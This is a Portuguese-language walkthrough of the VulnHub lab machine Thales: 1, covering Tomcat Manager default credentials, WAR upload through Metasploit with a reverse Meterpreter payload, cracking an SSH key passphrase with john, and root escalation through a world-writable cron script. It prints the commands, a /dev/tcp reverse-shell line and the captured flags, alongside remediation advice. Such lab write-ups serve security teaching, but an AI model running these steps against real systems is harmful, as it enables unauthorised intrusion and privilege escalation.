# Thales: 1 — Tomcat com Credenciais Padrão e um Script de Cron Que Você Pode Sobrescrever

Bora rapaziada!! Thales: 1 empacota uma cadeia clássica de comprometimento: Apache Tomcat 9.0.52 com credenciais padrão `tomcat:role1`, upload de WAR via Metasploit para shell como `tomcat`, chave SSH privada world-readable no home de `thales`, quebra da passphrase com john e rockyou, e por último um script de cron world-writable que seta o SUID no `/bin/bash`. Sensacional para aprender fundamentos do ciclo Tomcat-to-root. Caramba, cada passo aqui aparece em pentest real.

| Campo | Valor |
|---|---|
| **Nível** | Fácil |
| **VM Alvo** | Thales: 1 |
| **VM Atacante** | Kali Linux |
| **URL VulnHub** | https://www.vulnhub.com/entry/thales-1,749/ |
| **Técnicas** | Nmap, Tomcat Manager brute force, upload WAR Metasploit, extração de chave SSH privada, ssh2john + john, cron world-writable, SUID /bin/bash |
| **CVEs** | CWE-521 (credenciais fracas Tomcat), CWE-732 (chave SSH privada world-readable), CWE-269 (script cron world-writable levando a SUID bash) |
| **Grupos APT** | APT41: explora Tomcat Manager com credenciais padrão para acesso inicial em ambientes enterprise; múltiplos grupos ransomware usam scripts de cron world-writable como vetor de escalação |

---

## Resumo do Ataque

```
nmap → SSH 22, Tomcat 8080
  → Tomcat Manager: brute force → tomcat:role1
  → MSF tomcat_mgr_upload → Meterpreter (tomcat)
  → /home/thales/.ssh/id_rsa (world-readable + criptografada)
  → ssh2john → john + rockyou → vodka06
  → SSH thales:vodka06 → notes.txt → /usr/local/bin/backup.sh
  → backup.sh: world-writable, dono root, executado por cron
  → aguarda cron → chmod 4777 /bin/bash setado
  → /bin/bash -p → euid=0(root)
  → /root/root.txt
```

---

## Metodologia

1. Scan de portas: SSH 22, Tomcat 8080
2. Brute force Tomcat Manager: credenciais padrão tomcat:role1
3. Upload WAR via Metasploit: shell como usuário tomcat
4. Descoberta de chave SSH privada world-readable
5. Extração da chave, ssh2john, quebra com john e rockyou
6. SSH como thales com passphrase descoberta
7. Leitura de notes.txt: referência ao backup.sh
8. Análise do backup.sh: world-writable, executado pelo root via cron
9. Aguardar cron: SUID setado em /bin/bash
10. /bin/bash -p → root, captura da flag

---

## Passo 1 — Descoberta e Scan de Portas

```bash
netdiscover -r 192.168.56.0/24
nmap -sV -sC -p- 192.168.56.102
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu
8080/tcp open  http    Apache Tomcat 9.0.52
```

Dois serviços: SSH e Tomcat. Tomcat na 8080 é a superfície de ataque principal.

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 2 — Brute Force Tomcat Manager

```bash
curl -u "tomcat:role1" http://192.168.56.102:8080/manager/html -o /dev/null -w "%{http_code}\n"
# → 200
```

**Credenciais confirmadas:** `tomcat:role1` (padrão do Tomcat).

Alternativa com Metasploit:

```bash
use auxiliary/scanner/http/tomcat_mgr_login
set RHOSTS 192.168.56.102
set RPORT 8080
run
```

**Nota real:** Credenciais padrão do Tomcat Manager são universalmente conhecidas e exploradas. APT41 usa isso como vetor de acesso inicial padronizado em ambientes corporativos que rodam Java EE.

**MITRE ATT&CK:** T1078.001 — Contas Válidas: Contas Padrão; T1110 — Força Bruta

---

## Passo 3 — Upload WAR via Metasploit (Shell como tomcat)

```bash
msfconsole -q
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS 192.168.56.102
set RPORT 8080
set HttpUsername tomcat
set HttpPassword role1
set PAYLOAD java/meterpreter/reverse_tcp
set LHOST 192.168.56.ATACANTE
set LPORT 4449
run
```

Sessão Meterpreter abre como `tomcat`. Explorar o filesystem:

```bash
meterpreter > shell
id
# uid=999(tomcat)
ls /home/thales/
cat /home/thales/user.txt
# a837c0b5d2a8a07225fd9905f5a0e9c4
```

**MITRE ATT&CK:** T1190 — Explorar Aplicação de Face Pública; T1059.007 — JavaScript/JScript (WAR Java)

---

## Passo 4 — Chave SSH Privada World-Readable

```bash
ls -la /home/thales/.ssh/
# -rw-r--r-- 1 thales thales 1876 id_rsa  ← world-readable!
cat /home/thales/.ssh/id_rsa
```

Copiar para a máquina atacante (via nc ou base64):

```bash
# No alvo:
base64 /home/thales/.ssh/id_rsa
# Na máquina atacante: decodificar e salvar como thales_id_rsa
```

**Nota real:** Chaves SSH privadas world-readable permitem que qualquer processo comprometido no sistema roube credenciais de acesso SSH. Sempre `chmod 600` em chaves privadas.

**MITRE ATT&CK:** T1552.004 — Credenciais Sem Proteção: Chaves Privadas

---

## Passo 5 — Quebrar Passphrase da Chave SSH

```bash
python3 /usr/share/john/ssh2john.py thales_id_rsa > thales_hash
john --wordlist=/usr/share/wordlists/rockyou.txt thales_hash
```

```
vodka06  (thales_id_rsa)
```

**MITRE ATT&CK:** T1110.002 — Força Bruta: Quebra de Senha

---

## Passo 6 — SSH como thales e Descoberta do backup.sh

```bash
chmod 600 thales_id_rsa
ssh -i thales_id_rsa thales@192.168.56.102
# Passphrase: vodka06

cat notes.txt
# "I prepared a backup script for you. The script is in /usr/local/bin/backup.sh"

ls -la /usr/local/bin/backup.sh
# -rwxrwxrwx 1 root root  ← world-writable, dono root!

cat /usr/local/bin/backup.sh
# #!/bin/bash
# chmod 4777 /bin/bash
# /bin/bash -i >& /dev/tcp/IP/6667 0>&1
```

O script já contém `chmod 4777 /bin/bash`. Um cron de root o executa periodicamente.

**MITRE ATT&CK:** T1053.003 — Tarefa Agendada: Cron; T1546 — Mecanismos de Execução por Evento

---

## Passo 7 — Aguardar Cron e Escalar para Root

Após o cron executar (tipicamente a cada minuto):

```bash
ls -la /bin/bash
# -rwsrwxrwx 1 root root  ← SUID setado!

/bin/bash -p
bash-4.4# id
# uid=1000(thales) gid=1000(thales) euid=0(root)

cat /root/root.txt
# 3a1c85bebf8833b0ecae900fb8598b17
```

(☞ﾟヮﾟ)☞ Root. O cron trabalhou por nós, véi!

**MITRE ATT&CK:** T1548.001 — Mecanismo de Controle de Elevação: Setuid e Setgid

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado Em | Observações |
|---|---|---|---|
| Credencial Tomcat | tomcat:role1 | Brute force Manager | Credenciais padrão |
| Passphrase SSH | vodka06 | john + rockyou | Chave de thales |
| Flag usuário | a837c0b5d2a8a07225fd9905f5a0e9c4 | /home/thales/user.txt | Após shell Tomcat |
| Flag root | 3a1c85bebf8833b0ecae900fb8598b17 | /root/root.txt | Após cron + SUID bash |

---

## Lições Aprendidas

| # | Descoberta | Relevância no Mundo Real | Conclusão |
|---|---|---|---|
| 1 | Tomcat Manager com credenciais padrão | APT41 usa Tomcat Manager como vetor padrão de acesso inicial em ambientes Java EE | Remover credenciais padrão imediatamente; restringir `/manager/` por IP |
| 2 | Chave SSH privada world-readable | Qualquer processo comprometido no sistema pode roubar e usar a chave para acesso SSH | Permissões `600` em todas as chaves privadas; nunca armazenar em diretórios acessíveis a outros |
| 3 | Script cron world-writable executado como root | Clássico vetor de escalação; qualquer usuário injeta código executado como root | Auditar todos os scripts de cron; `chmod 700` e `chown root:root` |
| 4 | SUID em /bin/bash | Uma vez setado, qualquer usuário local obtém root com `/bin/bash -p` | Auditar regularmente com `find / -perm -4000 -type f` |

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | ID TTP |
|---|---|---|---|
| Acesso Inicial | Acesso Inicial | Explorar Aplicação de Face Pública | T1190 |
| Acesso a Credenciais | Acesso a Credenciais | Força Bruta | T1110 |
| Acesso a Credenciais | Acesso a Credenciais | Chaves Privadas | T1552.004 |
| Acesso a Credenciais | Acesso a Credenciais | Quebra de Senha | T1110.002 |
| Movimento Lateral | Movimento Lateral | Serviços Remotos: SSH | T1021.004 |
| Persistência | Persistência | Tarefa Agendada: Cron | T1053.003 |
| Escalação de Privilégios | Escalação de Privilégios | Setuid e Setgid | T1548.001 |

---

## Remediação e Contenção

### Correções Técnicas

1. Alterar credenciais Tomcat: substituir `tomcat:role1` por senha forte; restringir `/manager/` a localhost ou IPs confiáveis
2. Corrigir permissões da chave SSH: `chmod 600 /home/thales/.ssh/id_rsa`
3. Corrigir script cron: `chmod 700 /usr/local/bin/backup.sh; chown root:root /usr/local/bin/backup.sh`
4. Corrigir SUID em bash: `chmod 0755 /bin/bash`; auditar SUID regularmente

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gestão de Ativos | Inventariar todos os serviços Tomcat; auditar scripts de cron |
| Proteger | Controle de Acesso | Credenciais fortes no Tomcat; permissões corretas em chaves SSH e scripts cron |
| Detectar | Anomalias e Eventos | Alertar em modificações de scripts executados por root; monitorar SUID |
| Responder | Planejamento de Resposta | Remover WAR malicioso; rotacionar credenciais Tomcat e SSH |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| AC-3 | Aplicação de Acesso | Restringir Tomcat Manager por IP; permissões corretas em scripts cron |
| AC-6 | Menor Privilégio | Scripts cron com permissões mínimas; sem SUID em shell |
| IA-5 | Gestão de Autenticadores | Alterar credenciais padrão Tomcat; proteger chaves SSH |
| CM-7 | Menor Funcionalidade | Remover/restringir Tomcat Manager em produção |

### CISA KEV

CVE-2015-1328 (overlayfs, se aplicável no ambiente) está catalogado no CISA KEV. Credenciais padrão do Tomcat Manager mapeiam para padrões em CISA Alert AA22-074A sobre vetores de acesso inicial via aplicações web.

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gestão de Identidade e Acesso (IAM) | Gerenciar Credenciais e Autenticação | MIL3 |
| Gestão de Ameaças e Vulnerabilidades (THREAT) | Gerenciar Vulnerabilidades | MIL2 |

### MITRE D3FEND

- **D3-ACH** — Hardening de Configuração de Aplicação (credenciais Tomcat; restrição de Manager)
- **D3-OAM** — Gestão Administrativa do SO (auditoria SUID; hardening scripts cron)

---

## Considerações Finais

Thales: 1 é uma máquina de fundamentos que cobre a cadeia Tomcat-to-root com clareza exemplar. Cada vulnerabilidade aqui (credenciais padrão, chave world-readable, script cron world-writable) é encontrada em ambientes reais com frequência surpreendente. A lição mais importante: administradores instalam Tomcat, não trocam as credenciais padrão, e nunca mais olham para as permissões de arquivo.

Auditoria proativa de permissões evita tudo isso.

Thanks guys!! (❍ᴥ❍ʋ)
